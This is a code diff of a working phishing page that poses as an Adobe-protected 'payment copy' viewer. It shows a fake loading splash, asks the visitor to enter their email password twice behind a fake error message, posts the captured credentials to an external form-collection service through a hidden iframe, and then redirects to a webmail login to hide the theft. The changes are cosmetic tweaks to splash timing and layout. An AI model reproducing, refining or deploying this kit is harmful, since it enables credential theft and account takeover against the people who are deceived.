@@ -12,13 +12,21 @@
       background: #f6f6f6 url('download.jpg') no-repeat center top;
       background-size: cover;
       overflow: hidden;
+      position: relative;
     }
+    /* Splash overlay with image preview */
     #splash {
       position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-      background: #fff; display: flex; align-items: center; justify-content: center; flex-direction: column;
-      z-index: 9999; transition: opacity 1s ease;
+      background: #fff; display: flex; align-items: center; justify-content: center;
+      flex-direction: column; z-index: 9999; transition: opacity 1s ease;
+      text-align: center;
     }
-    #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 10px; }
+    #splash img {
+      width: 160px; height: auto;
+      margin-bottom: 16px; border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    }
+    #splash h2 { font-size: 22px; color: #d32f2f; margin-bottom: 6px; }
     #splash p { color: #666; font-size: 14px; }
     .loader {
       margin-top: 20px; width: 36px; height: 36px;
@@ -26,13 +34,19 @@
       border-radius: 50%; animation: spin 1s linear infinite;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+
     #main {
-      display: none; height: 100%;
-      display: flex; align-items: flex-start; justify-content: center;
-      padding: 28px 12px 60px; position: relative;
+      display: none;
+      height: 100%;
+      display: flex;
+      align-items: flex-start;
+      justify-content: center;
+      padding: 28px 12px 60px;
+      position: relative;
     }
     #main.show { display: flex; animation: fadeIn 1s ease; }
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
     body::before {
       content: "PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY  PAYMENT COPY";
       position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
@@ -81,12 +95,16 @@
   </style>
 </head>
 <body>
+
+  <!-- Splash screen with image -->
   <div id="splash">
+    <img src="download.jpg" alt="Preview">
     <h2>Loading Secure Viewer…</h2>
     <p>Please wait while we prepare your file</p>
     <div class="loader"></div>
   </div>
 
+  <!-- Main form -->
   <div id="main">
     <div class="card">
       <div class="pdf-icon">
@@ -96,7 +114,6 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <!-- form submission using iframe -->
       <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" target="hiddenFrame" autocomplete="on">
         <div id="stepEmail">
           <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly required>
@@ -116,7 +133,6 @@
           <input type="hidden" name="password1" id="firstPasswordField">
 
           <div id="errorMessage" class="error-message" style="display: none;">Please re-enter password.</div>
-          <div id="submitError" class="error-message" style="display: none;">Network error. Please try again.</div>
 
           <div class="download-wrap">
             <button class="btn-download" type="submit">DOWNLOAD</button>
@@ -140,14 +156,15 @@
   </div>
 
 <script>
+  // Splash fade-out after showing image
   window.addEventListener('load', () => {
     setTimeout(() => {
       document.getElementById('splash').style.opacity = '0';
       setTimeout(() => {
         document.getElementById('splash').style.display = 'none';
         document.getElementById('main').classList.add('show');
-      }, 500);
-    }, 800);
+      }, 700);
+    }, 2000); // stays visible for 2 seconds
   });
 
   const emailInput = document.getElementById('email');
@@ -183,7 +200,7 @@
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  // Handle password logic
+  // Handle double password and redirect
   document.getElementById('mainForm').addEventListener('submit', (e) => {
     if (passwordFirstEntry === "") {
       e.preventDefault();
@@ -195,7 +212,7 @@
       return false;
     }
 
-    // Show overlay loader
+    // Show overlay while submitting
     const overlay = document.createElement('div');
     overlay.style.cssText = `
       position:fixed;top:0;left:0;width:100%;height:100%;
@@ -215,13 +232,10 @@
     overlay.append(spinner, msg);
     document.body.append(overlay);
 
-    // Redirect after 3s
     setTimeout(() => {
       window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
     }, 3000);
   });
 </script>
-
-<style>@keyframes spin { to { transform: rotate(360deg); } }</style>
 </body>
 </html>
